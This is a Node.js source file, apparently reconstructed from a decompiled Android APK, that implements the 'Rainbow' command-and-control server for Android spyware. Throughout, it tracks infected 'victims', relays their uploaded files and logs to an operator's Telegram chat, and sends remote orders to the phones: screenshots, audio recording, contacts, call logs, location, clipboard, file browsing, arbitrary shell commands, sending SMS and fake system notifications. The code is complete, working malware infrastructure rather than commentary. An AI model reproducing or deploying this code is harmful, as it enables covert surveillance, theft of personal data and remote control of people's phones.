const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const fs = require('fs');

/**
 * SERVIDOR C2 RAINBOW - RECONSTRUCCIÓN ESTRICTA
 * Basado en el análisis de flujo de Smali y server(1).js original.
 */

// Carga de configuración desde data.json
let config = { token: "", id: "" };
try {
    const rawData = fs.readFileSync('./data.json', 'utf8');
    config = JSON.parse(rawData);
} catch (e) {
    console.error("Error crítico: No se pudo leer data.json");
    process.exit(1);
}

const app = express();
const server = http.createServer(app);

// Configuración de Socket.io para compatibilidad absoluta con Engine.io v3 (APK)
const io = new Server(server, {
    cors: { origin: "*" },
    allowEIO3: true, 
    transports: ['polling', 'websocket'], // El APK suele iniciar con polling
    pingInterval: 10000,
    pingTimeout: 5000,
    cookie: false
});

const bot = new TelegramBot(config.token, { polling: true });

// Almacén de víctimas y estados de chat
const victims = {}; 
const appData = {}; // Para seguimiento de pasos: { chatId: { target, step, temp } }

app.use(express.json());

// --- ENDPOINTS HTTP PARA RECEPCIÓN DE DATOS ---

const upload = multer({ storage: multer.memoryStorage() });

app.post('/upload', upload.single('file'), (req, res) => {
    const devId = req.headers['currenttarget'];
    if (req.file) {
        bot.sendDocument(config.id, req.file.buffer, {
            caption: `<b>✯ 𝙰𝚛𝚌𝚑𝚒𝚟𝚘 𝚛𝚎𝚌𝚒𝚋𝚒𝚍𝚘 𝚍𝚎:</b> <code>${devId}</code>`,
            parse_mode: 'HTML'
        }, { filename: req.file.originalname });
    }
    res.status(200).send('Done');
});

app.post('/text', (req, res) => {
    const devId = req.headers['currenttarget'];
    bot.sendMessage(config.id, `<b>✯ 𝙻𝚘𝚐 [${devId}]:</b>\n<pre>${req.body.text}</pre>`, { parse_mode: 'HTML' });
    res.status(200).send('Done');
});

// --- COMUNICACIÓN POR SOCKET (Lógica de n.smali) ---

io.on('connection', (socket) => {
    const query = socket.handshake.query;
    const deviceId = query.currenttarget || socket.handshake.headers['currenttarget'];
    
    // Si no hay ID, el servidor original desconecta inmediatamente
    if (!deviceId) {
        return socket.disconnect();
    }

    const model = query.model || "Android Device";
    const version = query.version || "N/A";

    victims[socket.id] = { id: deviceId, model: model, version: version };

    bot.sendMessage(config.id, `<b>✯ 𝙽𝚎𝚠 𝚍𝚎𝚟𝚒𝚌𝚎 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 ✯</b>\n\n<b>𝚖𝚘𝚍𝚎𝚕:</b> ${model}\n<b>𝚒𝚍:</b> <code>${deviceId}</code>\n<b>𝚟𝚎𝚛𝚜𝚒𝚘𝚗:</b> ${version}`, { parse_mode: 'HTML' });

    // El APK emite sus respuestas en el evento 'data'
    socket.on('data', (data) => {
        const response = typeof data === 'object' ? JSON.stringify(data, null, 2) : data;
        bot.sendMessage(config.id, `<b>✯ 𝚁𝚎𝚜𝚙𝚘𝚗𝚜𝚎 𝚏𝚛𝚘𝚖 ${model} ✯</b>\n<pre>${response}</pre>`, { parse_mode: 'HTML' });
    });

    socket.on('disconnect', () => {
        if (victims[socket.id]) {
            bot.sendMessage(config.id, `<b>❌ 𝙳𝚒𝚜𝚙𝚘𝚜𝚒𝚝𝚒𝚟𝚘 𝚍𝚒𝚜𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍:</b> ${victims[socket.id].model}`);
            delete victims[socket.id];
        }
    });
});

// --- INTERFAZ DE TELEGRAM (Strings Unicode exactos de server(1).js) ---

const KB_MAIN = [['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯'], ['✯ 𝙰𝚌𝚝𝚒𝚘𝚗𝚜 𝚏𝚘𝚛 𝚊𝚕𝚕 ✯']];
const KB_ACTIONS = [
    ['✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯', '✯ 𝙰𝚞𝚍𝚒𝚘 𝚛𝚎𝚌𝚘𝚛𝚍𝚎𝚛 ✯'],
    ['✯ 𝙵𝚒𝚕𝚎 𝚖𝚊𝚗𝚊𝚐𝚎𝚛 ✯', '✯ 𝚂𝙼𝚂 𝚖𝚊𝚗𝚊𝚐𝚎𝚛 ✯'],
    ['✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯', '✯ 𝙲𝚊𝚕𝚕 𝚕𝚘𝚐𝚜 ✯'],
    ['✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯', '✯ 𝙸𝚗𝚜𝚝𝚊𝚕𝚕𝚎𝚍 𝚊𝚙𝚙𝚜 ✯'],
    ['✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯', '✯ 𝚂𝚑𝚎𝚕𝚕 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 ✯'],
    ['✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯', '✯ 𝙻𝚘𝚌𝚊𝚝𝚒𝚘𝚗 ✯'],
    ['✯ 𝙼𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']
];

bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    if (String(chatId) !== String(config.id)) return;
    const text = msg.text;

    if (text === '/start' || text === '✯ 𝙼𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯') {
        delete appData[chatId];
        return bot.sendMessage(chatId, "<b>✯ 𝙼𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯</b>", {
            parse_mode: 'HTML',
            reply_markup: { keyboard: KB_MAIN, resize_keyboard: true }
        });
    }

    if (text === '✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯') {
        const buttons = Object.keys(victims).map(sid => [`${victims[sid].model} (${victims[sid].id})`]);
        if (buttons.length === 0) return bot.sendMessage(chatId, "No victims online.");
        buttons.push(['✯ 𝙼𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']);
        return bot.sendMessage(chatId, "<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚍𝚎𝚟𝚒𝚌𝚎 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚊𝚌𝚝𝚒𝚘𝚗 ✯</b>", {
            parse_mode: 'HTML',
            reply_markup: { keyboard: buttons, resize_keyboard: true }
        });
    }

    // Selección de dispositivo
    for (const sid in victims) {
        if (text === `${victims[sid].model} (${victims[sid].id})`) {
            appData[chatId] = { target: sid };
            return bot.sendMessage(chatId, `<b>✯ 𝙰𝚌𝚝𝚒𝚘𝚗𝚜 𝚏𝚘𝚛 ${victims[sid].model} ✯</b>`, {
                parse_mode: 'HTML',
                reply_markup: { keyboard: KB_ACTIONS, resize_keyboard: true }
            });
        }
    }

    const state = appData[chatId];
    if (!state || !state.target) return;

    const socket = io.sockets.sockets.get(state.target);
    if (!socket) {
        bot.sendMessage(chatId, "Device disconnected.");
        return delete appData[chatId];
    }

    // --- LÓGICA DE PASOS (STEPS) ---
    if (state.step) {
        let payload = null;
        if (state.step === 'REC') payload = { order: 'record-audio', duration: text };
        else if (state.step === 'SHELL') payload = { order: 'shell', command: text };
        else if (state.step === 'PUSH') payload = { order: 'notification', title: 'System Message', text: text };
        else if (state.step === 'SMS_N') {
            state.tmpNum = text;
            state.step = 'SMS_M';
            return bot.sendMessage(chatId, "<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 ✯</b>", { parse_mode: 'HTML' });
        } else if (state.step === 'SMS_M') {
            payload = { order: 'send-sms', number: state.tmpNum, text: text };
        }

        if (payload) {
            socket.emit('data', payload);
            bot.sendMessage(chatId, `🚀 Order sent: <b>${payload.order}</b>`, { parse_mode: 'HTML' });
            delete state.step;
            return;
        }
    }

    // --- SWITCH DE COMANDOS (Fiel a d.smali) ---
    let order = null;
    let extra = {};

    switch (text) {
        case '✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯': order = "screenshot"; break;
        case '✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯': order = "contacts"; break;
        case '✯ 𝙲𝚊𝚕𝚕 𝚕𝚘𝚐𝚜 ✯': order = "calls"; break;
        case '✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯': order = "clipboard"; break;
        case '✯ 𝙸𝚗𝚜𝚝𝚊𝚕𝚕𝚎𝚍 𝚊𝚙𝚙𝚜 ✯': order = "apps"; break;
        case '✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯': order = "vibrate"; break;
        case '✯ 𝙻𝚘𝚌𝚊𝚝𝚒𝚘𝚗 ✯': order = "location"; break;
        case '✯ 𝙵𝚒𝚕𝚎 𝚖𝚊𝚗𝚊𝚐𝚎𝚛 ✯': order = "file-explorer"; extra = { path: "/" }; break;
        
        case '✯ 𝙰𝚞𝚍𝚒𝚘 𝚛𝚎𝚌𝚘𝚛𝚍𝚎𝚛 ✯':
            state.step = 'REC';
            return bot.sendMessage(chatId, "<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚍𝚞𝚛𝚊𝚝𝚒𝚘𝚗 (𝚜𝚎𝚌) ✯</b>", { parse_mode: 'HTML' });
        case '✯ 𝚂𝚑𝚎𝚕𝚕 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 ✯':
            state.step = 'SHELL';
            return bot.sendMessage(chatId, "<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 ✯</b>", { parse_mode: 'HTML' });
        case '✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯':
            state.step = 'PUSH';
            return bot.sendMessage(chatId, "<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 𝚝𝚎𝚡𝚝 ✯</b>", { parse_mode: 'HTML' });
        case '✯ 𝚂𝙼𝚂 𝚖𝚊𝚗𝚊𝚐𝚎𝚛 ✯':
            state.step = 'SMS_N';
            return bot.sendMessage(chatId, "<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚙𝚑𝚘𝚗𝚎 𝚗𝚞𝚖𝚋𝚎𝚛 ✯</b>", { parse_mode: 'HTML' });
    }

    if (order) {
        socket.emit('data', { order: order, ...extra });
        bot.sendMessage(chatId, `🚀 Order sent: <b>${order}</b>`, { parse_mode: 'HTML' });
    }
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`[C2] Rainbow Server Online en puerto ${PORT}`));
